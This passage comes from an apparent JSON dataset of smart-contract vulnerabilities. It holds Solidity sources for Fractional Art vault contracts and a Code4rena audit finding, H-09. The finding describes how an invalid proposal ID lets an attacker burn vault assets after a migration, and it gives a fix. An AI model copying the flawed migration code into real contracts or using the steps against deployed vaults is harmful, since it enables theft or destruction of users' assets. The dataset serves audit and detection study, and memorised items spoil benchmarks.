error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Clone} from \"clones-with-immutable-args/src/Clone.sol\";\nimport {ERC1155} from \"@rari-capital/solmate/src/tokens/ERC1155.sol\";\nimport {IFERC1155} from \"./interfaces/IFERC1155.sol\";\nimport {INFTReceiver} from \"./interfaces/INFTReceiver.sol\";\nimport \"./constants/Permit.sol\";\n\n/// @title FERC1155\n/// @author Fractional Art\n/// @notice An ERC-1155 implementation for Fractions\ncontract FERC1155 is Clone, ERC1155, IFERC1155 {\n    /// @notice Name of the token contract\n    string public constant NAME = \"FERC1155\";\n    /// @notice Version number of the token contract\n    string public constant VERSION = \"1\";\n    /// @notice Address that can deploy new vaults for this collection, manage metadata, etc\n    address internal _controller;\n    /// @notice URI of contract metadata\n    string public contractURI;\n    /// @notice Mapping of token type approvals owner => operator => tokenId => approved\n    mapping(address => mapping(address => mapping(uint256 => bool)))\n        public isApproved;\n    /// @notice Mapping of metadata contracts for token ID types => metadata address\n    mapping(uint256 => address) public metadata;\n    /// @notice Mapping to track account nonces for metadata txs owner => nonces\n    mapping(address => uint256) public nonces;\n    /// @notice Mapping to track total supply for token ID types => totalSupply\n    mapping(uint256 => uint256) public totalSupply;\n    /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress\n    mapping(uint256 => address) private royaltyAddress;\n    /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent\n    mapping(uint256 => uint256) private royaltyPercent;\n\n    /// @notice Modifier for restricting function calls to the controller account\n    modifier onlyController() {\n        address controller_ = controller();\n        if (msg.sender != controller_)\n            revert InvalidSender(controller_, msg.sender);\n        _;\n    }\n\n    /// @notice Modifier for restricting function calls to the VaultRegistry\n    modifier onlyRegistry() {\n        address vaultRegistry = VAULT_REGISTRY();\n        if (msg.sender != vaultRegistry)\n            revert InvalidSender(vaultRegistry, msg.sender);\n        _;\n    }\n\n    /// @notice Burns fractions for an ID\n    /// @param _from Address to burn fraction tokens from\n    /// @param _id Token ID to burn\n    /// @param _amount Number of tokens to burn\n    function burn(\n        address _from,\n        uint256 _id,\n        uint256 _amount\n    ) external onlyRegistry {\n        _burn(_from, _id, _amount);\n        totalSupply[_id] -= _amount;\n    }\n\n    /// @notice Hook to emit the URI update when setting the metadata or updating\n    /// @param _id Token ID metadata was updated for\n    /// @param _uri URI of metadata\n    function emitSetURI(uint256 _id, string memory _uri) external {\n        if (msg.sender != metadata[_id])\n            revert InvalidSender(metadata[_id], msg.sender);\n        emit URI(_uri, _id);\n    }\n\n    /// @notice Mints new fractions for an ID\n    /// @param _to Address to mint fraction tokens to\n    /// @param _id Token ID to mint\n    /// @param _amount Number of tokens to mint\n    /// @param _data Extra calldata to include in the mint\n    function mint(\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) external onlyRegistry {\n        _mint(_to, _id, _amount, _data);\n        totalSupply[_id] += _amount;\n    }\n\n    /// @notice Permit function that approves an operator for token type with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permit(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitStructHash(\n                _owner,\n                _operator,\n                _id,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApproved[_owner][_operator][_id] = _approved;\n\n        emit SingleApproval(_owner, _operator, _id, _approved);\n    }\n\n    /// @notice Permit function that approves an operator for all token types with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permitAll(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitAllStructHash(\n                _owner,\n                _operator,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApprovedForAll[_owner][_operator] = _approved;\n\n        emit ApprovalForAll(_owner, _operator, _approved);\n    }\n\n    /// @notice Scoped approvals allow us to eliminate some of the risks associated with setting the approval for an entire collection\n    /// @param _operator Address of spender account\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for operator(spender) account\n    function setApprovalFor(\n        address _operator,\n        uint256 _id,\n        bool _approved\n    ) external {\n        isApproved[msg.sender][_operator][_id] = _approved;\n\n        emit SingleApproval(msg.sender, _operator, _id, _approved);\n    }\n\n    /// @notice Sets the contract metadata\n    /// @param _uri URI of metadata\n    function setContractURI(string calldata _uri) external onlyController {\n        contractURI = _uri;\n    }\n\n    /// @notice Sets the token metadata contract\n    /// @param _metadata Address for metadata contract\n    /// @param _id Token ID to set the metadata for\n    function setMetadata(address _metadata, uint256 _id)\n        external\n        onlyController\n    {\n        metadata[_id] = _metadata;\n        emit SetMetadata(_metadata, _id);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _receiver Address to receive royalties\n    /// @param _percentage Percentage of royalties on secondary sales\n    function setRoyalties(\n        uint256 _id,\n        address _receiver,\n        uint256 _percentage\n    ) external onlyController {\n        royaltyAddress[_id] = _receiver;\n        royaltyPercent[_id] = _percentage;\n        emit SetRoyalty(_receiver, _id, _percentage);\n    }\n\n    /// @notice Updates the controller address for the FERC1155 token contract\n    /// @param _newController Address of new controlling entity\n    function transferController(address _newController)\n        external\n        onlyController\n    {\n        if (_newController == address(0)) revert ZeroAddress();\n        _controller = _newController;\n        emit ControllerTransferred(_newController);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _salePrice Sale price to calculate the royalty for\n    function royaltyInfo(uint256 _id, uint256 _salePrice)\n        external\n        view\n        returns (address receiver, uint256 royaltyAmount)\n    {\n        receiver = royaltyAddress[_id];\n        royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100;\n    }\n\n    /// @notice Transfer an amount of a token type between two accounts\n    /// @param _from Source address for an amount of tokens\n    /// @param _to Destination address for an amount of tokens\n    /// @param _id ID of the token type\n    /// @param _amount The amount of tokens being transferred\n    /// @param _data Additional calldata\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) public override(ERC1155, IFERC1155) {\n        require(\n            msg.sender == _from ||\n                isApprovedForAll[_from][msg.sender] ||\n                isApproved[_from][msg.sender][_id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        balanceOf[_from][_id] -= _amount;\n        balanceOf[_to][_id] += _amount;\n\n        emit TransferSingle(msg.sender, _from, _to, _id, _amount);\n\n        require(\n            _to.code.length == 0\n                ? _to != address(0)\n                : INFTReceiver(_to).onERC1155Received(\n                    msg.sender,\n                    _from,\n                    _id,\n                    _amount,\n                    _data\n                ) == INFTReceiver.onERC1155Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n\n    /// @notice Getter for URI of a token type\n    /// @param _id ID of the token type\n    function uri(uint256 _id)\n        public\n        view\n        override(ERC1155, IFERC1155)\n        returns (string memory)\n    {\n        require(metadata[_id] != address(0), \"NO METADATA\");\n        return IFERC1155(metadata[_id]).uri(_id);\n    }\n\n    /// @notice Getter for controller account\n    function controller() public view returns (address controllerAddress) {\n        _controller == address(0)\n            ? controllerAddress = INITIAL_CONTROLLER()\n            : controllerAddress = _controller;\n    }\n\n    /// @notice Getter for initial controller account immutable argument stored in calldata\n    function INITIAL_CONTROLLER() public pure returns (address) {\n        return _getArgAddress(0);\n    }\n\n    /// @notice VaultRegistry address that is allowed to call mint() and burn()\n    function VAULT_REGISTRY() public pure returns (address) {\n        return _getArgAddress(20);\n    }\n\n    /// @dev Computes hash of permit struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitStructHash(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _id,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes hash of permit all struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitAllStructHash(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_ALL_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes domain separator to prevent signature collisions\n    /// @return Hash of the contract-specific fields\n    function _computeDomainSeparator() internal view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(NAME)),\n                    keccak256(bytes(VERSION)),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /// @dev Computes digest of domain separator and struct hash\n    /// @param _domainSeparator Hash of contract-specific fields\n    /// @param _structHash Hash of signature fields struct\n    /// @return Hash of the signature digest\n    function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Create2ClonesWithImmutableArgs} from \"clones-with-immutable-args/src/Create2ClonesWithImmutableArgs.sol\";\nimport {IVaultFactory} from \"./interfaces/IVaultFactory.sol\";\nimport {Vault} from \"./Vault.sol\";\n\n/// @title Vault Factory\n/// @author Fractional Art\n/// @notice Factory contract for deploying fractional vaults\ncontract VaultFactory is IVaultFactory {\n    /// @dev Use clones library for address types\n    using Create2ClonesWithImmutableArgs for address;\n    /// @notice Address of Vault proxy contract\n    address public implementation;\n    /// @dev Internal mapping to track the next seed to be used by an EOA\n    mapping(address => bytes32) internal nextSeeds;\n\n    /// @notice Initializes implementation contract\n    constructor() {\n        implementation = address(new Vault());\n    }\n\n    /// @notice Deploys new vault for sender\n    /// @return vault Address of deployed vault\n    function deploy() external returns (address payable vault) {\n        vault = deployFor(msg.sender);\n    }\n\n    /// @notice Gets pre-computed address of vault deployed by given account\n    /// @param _deployer Address of vault deployer\n    /// @return vault Address of next vault\n    function getNextAddress(address _deployer)\n        external\n        view\n        returns (address vault)\n    {\n        bytes32 salt = keccak256(abi.encode(_deployer, nextSeeds[_deployer]));\n        (uint256 creationPtr, uint256 creationSize) = implementation\n            .cloneCreationCode(abi.encodePacked());\n\n        bytes32 creationHash;\n        assembly {\n            creationHash := keccak256(creationPtr, creationSize)\n        }\n        bytes32 data = keccak256(\n            abi.encodePacked(bytes1(0xff), address(this), salt, creationHash)\n        );\n        vault = address(uint160(uint256(data)));\n    }\n\n    /// @notice Gets next seed value of given account\n    /// @param _deployer Address of vault deployer\n    /// @return Value of next seed\n    function getNextSeed(address _deployer) external view returns (bytes32) {\n        return nextSeeds[_deployer];\n    }\n\n    /// @notice Deploys new vault for given address\n    /// @param _owner Address of vault owner\n    /// @return vault Address of deployed vault\n    function deployFor(address _owner) public returns (address payable vault) {\n        bytes32 seed = nextSeeds[tx.origin];\n\n        // Prevent front-running the salt by hashing the concatenation of tx.origin and the user-provided seed.\n        bytes32 salt = keccak256(abi.encode(tx.origin, seed));\n\n        bytes memory data = abi.encodePacked();\n        vault = implementation.clone(salt, data);\n        Vault(vault).init();\n\n        // Transfer the ownership from this factory contract to the specified owner.\n        Vault(vault).transferOwnership(_owner);\n\n        // Increment the seed.\n        unchecked {\n            nextSeeds[tx.origin] = bytes32(uint256(seed) + 1);\n        }\n\n        // Log the vault via en event.\n        emit DeployVault(\n            tx.origin,\n            msg.sender,\n            _owner,\n            seed,\n            salt,\n            address(vault)\n        );\n    }\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol",
            "Migration.sol",
            "Vault.sol",
            "IMigration.sol",
            "FERC1155.sol",
            "VaultFactory.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "//solidity\n/// @notice Migrates an ERC-721 token to the new vault after a successful migration\n/// @param _vault Address of the vault\n/// @param _proposalId ID of the proposal\n/// @param _token Address of the ERC-721 token\n/// @param _tokenId ID of the token\n/// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\nfunction migrateVaultERC721(\n    address _vault,\n    uint256 _proposalId,\n    address _token,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    address newVault = migrationInfo[_vault][_proposalId].newVault;\n    // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n    IBuyout(buyout).withdrawERC721(\n        _vault,\n        _token,\n        newVault,\n        _tokenId,\n        _erc721TransferProof\n    );\n}\n",
                    "//solidity\nfunction IBuyout(buyout).withdrawERC721(\n    address _vault,\n    address _token,\n    address _to,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    // Reverts if address is not a registered vault\n    (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n    if (id == 0) revert NotVault(_vault);\n    // Reverts if auction state is not successful\n    (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n    State required = State.SUCCESS;\n    if (current != required) revert InvalidState(required, current);\n    // Reverts if caller is not the auction winner\n    if (msg.sender != proposer) revert NotWinner();\n\n    // Initializes vault transaction\n    bytes memory data = abi.encodeCall(\n        ITransfer.ERC721TransferFrom,\n        (_token, _vault, _to, _tokenId)\n    );\n    // Executes transfer of ERC721 token to caller\n    ..SNIP..\n}\n"
                ],
                "Type": " Malicious User Could Burn The Assets After A Successful Migration",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L334\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L358\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L383\n\n\nThe following describes the migration process for a vault.\n\n1.  Assume that Alice is the proposer.\n2.  Alice calls Migration.propose to propose a set of modules and plugins to migrate a vault to\n3.  Other contributors could join a migration proposal by contributing ether and fractional tokens by calling Migration.join.\n4.  Alice calls Migration.commit to kick off the buyout process for a migration after the proposal period (7 days)\n5.  If the buyout is successful, Alice calls the Migration.settleVault to settle a migration. Within this function,  a new vault with new set permissions and plugins will be deployed.\n6.  Alice calls the Migration.settleFractions to mint the fractional tokens for a new vault.\n7.  Contributors who earlier joined the migration proposal could call the Migration.migrateFractions to migrate their fractional tokens from the old vault to the new vault.\n8.  Finally, Alice will call Migration.migrateVaultERC20, Migration.migrateVaultERC721, and/or Migration.migrateVaultERC1155 to transfer the ERC20, ERC721 (NFT), and/or ERC1155 tokens from the old vault to the new vault.\n\n\nIt was observed that after a successful vault migration, an attacker could Migration.migrateVaultERC20(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L334), Migration.migrateVaultERC721(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L358), and/or Migration.migrateVaultERC1155(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L383) with an invalid _proposalId parameter, causing the assets within the vault to be burned.\n\n\n The PoC for Migration.migrateVaultERC20, Migration.migrateVaultERC721, and/or Migration.migrateVaultERC1155 is the same. Thus, only the PoC for Migration.migrateVaultERC721 is shown below, and the PoC for migrateVaultERC20 and migrateVaultERC1155 are omitted for brevity.\n\nAssume that the following:\n\n*   vault A holds only one (1) APE ERC721 NFT\n\n*   Alice proposes to migrate  vault A   to a new vault, and the buyout is successful.\n\n*   Alice proceeds to call Migration.settleVault to settle a migration, followed by Migration.settleFractions to mint the fractional tokens for a new vault.\n\n*   An attacker calls Migration.migrateVaultERC721(vault A, invalid_proposal_id, ape_nft_address, ape_nft_tokenId, erc721TransferProof) with an invalid proposal ID (proposal ID that does not exist).\n    *   Within the Migration.migrateVaultERC721 function, the newVault = migrationInfo[_vault][_proposalId].newVault will evaluate to zero. This is because the _proposalId is a non-existent index in the migrationInfo array, so it will point to an address space that has not been initialised yet. Thus, the value zero will be returned, and newVault will be set to address(0).\n\n*   Next, the Migration.migrateVaultERC721 function will attempt to transfer the ERC721 NFT from the old vault (_vault) to the new vault (newVault) by calling IBuyout(buyout).withdrawERC721. Since newVault is set to address(0), this will cause the ERC721 NFT to be sent to address(0), which effectively burns the NFT.\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L358\n\nsolidity\n/// @notice Migrates an ERC-721 token to the new vault after a successful migration\n/// @param _vault Address of the vault\n/// @param _proposalId ID of the proposal\n/// @param _token Address of the ERC-721 token\n/// @param _tokenId ID of the token\n/// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\nfunction migrateVaultERC721(\n    address _vault,\n    uint256 _proposalId,\n    address _token,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    address newVault = migrationInfo[_vault][_proposalId].newVault;\n    // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n    IBuyout(buyout).withdrawERC721(\n        _vault,\n        _token,\n        newVault,\n        _tokenId,\n        _erc721TransferProof\n    );\n}\n\n\n\nWhen a user proposes a migration, the user will kick off the buyout process after the proposal period. The Migration module will initiate the buyout on behalf of the user. Thus, the proposer of this buyout, in this case, would be the Migration module. Whenever Buyout.withdrawERC721 function is called, it will verify that msg.sender is equal to the proposer to ensure that only the proposer who is the auction winner can migrate the assets from old vault to new vault.\n\nIn this example, the attacker has access to Migration.migrateVaultERC20, Migration.migrateVaultERC721, and/or Migration.migrateVaultERC1155 functions that effectively instruct the Migration module to perform the withdrawal. In this case, it will pass the if (msg.sender != proposer) revert NotWinner(); validation within the Buyout.withdrawERC721 because the msg.sender is the Migration contract who initiates the buyout at the start.\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L343\n\nsolidity\nfunction IBuyout(buyout).withdrawERC721(\n    address _vault,\n    address _token,\n    address _to,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    // Reverts if address is not a registered vault\n    (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n    if (id == 0) revert NotVault(_vault);\n    // Reverts if auction state is not successful\n    (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n    State required = State.SUCCESS;\n    if (current != required) revert InvalidState(required, current);\n    // Reverts if caller is not the auction winner\n    if (msg.sender != proposer) revert NotWinner();\n\n    // Initializes vault transaction\n    bytes memory data = abi.encodeCall(\n        ITransfer.ERC721TransferFrom,\n        (_token, _vault, _to, _tokenId)\n    );\n    // Executes transfer of ERC721 token to caller\n    ..SNIP..\n}\n\n\n\nYes, it is possible to send NFT to address(0).\n\nIf the ERC721 NFT contract uses Openzeppelin's ERC721 contract(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol) or Solmate's ERC721 contract(https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC721.sol#L89), then the NFT cannot be sent to address(0) because the contracts have implemented validation check to ensure that the to address is not address(0).\n\nHowever, not all the ERC721 NFT contracts use Openzeppelin or Solmate ERC721 implementation. Therefore, there will be a large number of custom implementations that allow NFT to be transferred to address(0).\n\nThe same theory applies to ERC20 and ERC1155 implementations.\n\n\nLoss of assets for the users as the assets that they own can be burned by an attacker after a successful migration.\n\n",
                "Repair": "\nIt is recommended to implement additional validation to ensure that the _proposalId submitted is valid.\n\nConsider checking if newVault points to a valid vault address before transferring the assets from old vault to new vault.\n\ndiff\nfunction migrateVaultERC721(\n    address _vault,\n    uint256 _proposalId,\n    address _token,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    address newVault = migrationInfo[_vault][_proposalId].newVault;\n+    if (newVault == address(0)) reverts VaultDoesNotExistOrInvalid;\n    \n    // Withdraws an ERC-721 token from the old vault and transfers to the new vault\n    IBuyout(buyout).withdrawERC721(\n        _vault,\n        _token,\n        newVault,\n        _tokenId,\n        _erc721TransferProof\n    );\n}\n\n\nIn the above implementation, if anyone attempts to submit an invalid _proposalId, the newVault will be set to address(0). The newly implemented validation will detect the abnormal behavior and revert the transaction.\n\nFor defense-in-depth, perform additional validation to ensure that the _to address is not address(0) within the Buyout.withdrawERC721 function.\n\ndiff\nfunction withdrawERC721(\n    address _vault,\n    address _token,\n    address _to,\n    uint256 _tokenId,\n    bytes32[] calldata _erc721TransferProof\n) external {\n    // Reverts if address is not a registered vault\n    (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n    if (id == 0) revert NotVault(_vault);\n+   if (_to == 0) revert ToAddressIsZero(); \n    // Reverts if auction state is not successful\n    (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n    State required = State.SUCCESS;\n    if (current != required) revert InvalidState(required, current);\n    // Reverts if caller is not the auction winner\n    if (msg.sender != proposer) revert NotWinner();\n\n    // Initializes vault transaction\n    bytes memory data = abi.encodeCall(\n        ITransfer.ERC721TransferFrom,\n        (_token, _vault, _to, _tokenId)\n    );\n    // Executes transfer of ERC721 token to caller\n    IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);\n}\n\n\nThe same validation checks should be implemented on migrateVaultERC20, migrateVaultERC1155, withdrawERC20 and withdrawERC1155\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/649)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/459#issuecomment-1203328808):\n  migrateVaultERC20 could transfer assets to address(0). ERC721 and 1155 standards require revert when to is address(0), but this is not required by the ERC20 standard. This could be triggered by calling migrate with an invalid proposalId. Agree this is a High risk issue.\n \n Selecting this submission as the primary report for clearly outlining the potential high risk scenario here.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address 